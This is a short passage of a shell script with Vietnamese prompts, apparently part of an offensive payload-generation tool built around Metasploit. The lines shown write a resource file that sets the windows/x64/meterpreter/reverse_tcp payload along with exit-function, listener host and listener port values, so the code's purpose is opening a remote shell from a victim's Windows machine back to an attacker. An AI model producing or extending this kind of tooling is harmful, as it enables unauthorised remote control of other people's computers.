...
no="     Không "
cat << !
Các tùy chọn của tải trọng (windows/x64/meterpreter/reverse_tcp):
...
config_file="$payload_path_present/Config/config"
	echo "set payload windows/x64/meterpreter/reverse_tcp" >> $rc_file
	echo "set EXITFUNC $exitfunc" >> $rc_file
	paylo="windows/x64/meterpreter/reverse_tcp"
	lhost=$lhost
	lport=$lport
}
